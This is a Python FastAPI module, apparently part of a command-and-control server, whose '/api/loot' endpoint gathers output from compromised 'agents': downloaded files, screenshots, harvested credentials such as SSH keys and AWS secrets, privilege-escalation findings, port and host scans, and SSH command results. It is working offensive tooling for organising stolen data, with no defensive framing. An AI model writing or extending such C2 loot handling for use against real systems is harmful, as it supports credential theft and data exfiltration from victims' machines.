from fastapi import APIRouter, Depends
from sqlalchemy.orm import Session
from db.database import get_db
from models.agent import Agent
from models.task import Task
from core.auth import get_current_operator
import base64, re

router = APIRouter(prefix="/api/loot", tags=["loot"])


@router.get("/")
def get_loot(db: Session = Depends(get_db), _: str = Depends(get_current_operator)):
    """
    Parse all completed tasks and extract loot:
    - Files downloaded (FILE:<name>:BASE64:<data>)
    - Screenshots (SCREENSHOT:BASE64:<data>)
    - Credentials harvested (creds command output)
    - PrivEsc findings (privesc command output)
    - Port scan results (portscan command)
    - Host discoveries (hostscan command)
    - SSH exec results
    """
    tasks = (
        db.query(Task)
        .filter(Task.status == "completed", Task.output != "")
        .order_by(Task.completed_at.desc())
        .all()
    )

    agents = {a.id: a for a in db.query(Agent).all()}

    files       = []
    screenshots = []
    creds_list  = []
    privesc_list = []
    scans       = []
    ssh_results = []

    for t in tasks:
        agent = agents.get(t.agent_id)
        agent_label = agent.hostname if agent else t.agent_id[:8]
        ts = t.completed_at.isoformat() + "Z" if t.completed_at else ""

        output = t.output or ""

        # Downloaded files
        if output.startswith("FILE:") and ":BASE64:" in output:
            parts = output.split(":BASE64:", 1)
            filename = parts[0].replace("FILE:", "", 1).strip()
            b64data  = parts[1].strip()
            try:
                size = len(base64.b64decode(b64data + "=="))
            except Exception:
                size = 0
            files.append({
                "task_id": t.id,
                "agent": agent_label,
                "filename": filename,
                "size_bytes": size,
                "b64": b64data,
                "timestamp": ts,
                "source_path": t.command.replace("download ", "", 1).strip(),
            })

        # Screenshots
        elif output.startswith("SCREENSHOT:BASE64:"):
            b64data = output.replace("SCREENSHOT:BASE64:", "", 1).strip()
            screenshots.append({
                "task_id": t.id,
                "agent": agent_label,
                "b64": b64data,
                "timestamp": ts,
            })

        # Credentials harvest
        elif t.command.strip() == "creds" and len(output) > 10:
            # Extract SSH keys, AWS creds, etc.
            sections = _parse_creds_output(output)
            creds_list.append({
                "task_id": t.id,
                "agent": agent_label,
                "timestamp": ts,
                "raw": output[:4000],
                "sections": sections,
            })

        # PrivEsc
        elif t.command.strip() == "privesc" and len(output) > 10:
            critical = [l for l in output.splitlines() if "[!!!]" in l]
            privesc_list.append({
                "task_id": t.id,
                "agent": agent_label,
                "timestamp": ts,
                "raw": output[:4000],
                "critical": critical,
            })

        # Port / host scans
        elif t.command.startswith(("portscan", "hostscan")):
            open_ports = _parse_ports(output)
            scans.append({
                "task_id": t.id,
                "agent": agent_label,
                "command": t.command,
                "timestamp": ts,
                "output": output[:2000],
                "open_ports": open_ports,
            })

        # SSH exec
        elif t.command.startswith("ssh-exec") or t.command.startswith("ssh-key-exec"):
            ssh_results.append({
                "task_id": t.id,
                "agent": agent_label,
                "command": t.command[:80],
                "output": output[:2000],
                "timestamp": ts,
            })

    return {
        "summary": {
            "files": len(files),
            "screenshots": len(screenshots),
            "creds": len(creds_list),
            "privesc": len(privesc_list),
            "scans": len(scans),
            "ssh_results": len(ssh_results),
        },
        "files":       files,
        "screenshots": screenshots,
        "creds":       creds_list,
        "privesc":     privesc_list,
        "scans":       scans,
        "ssh_results": ssh_results,
    }


def _parse_creds_output(text: str) -> list:
    sections = []
    current = None
    for line in text.splitlines():
        m = re.match(r"══════ (.+?) \[(.+?)\] ══════", line)
        if m:
            if current:
                sections.append(current)
            current = {"path": m.group(1), "category": m.group(2), "lines": []}
        elif current is not None:
            current["lines"].append(line)
    if current:
        sections.append(current)
    return sections


def _parse_ports(text: str) -> list:
    ports = []
    for line in text.splitlines():
        m = re.match(r"\s*(\d+)/tcp\s+(.+)", line)
        if m:
            ports.append({"port": int(m.group(1)), "service": m.group(2).strip()})
    return ports
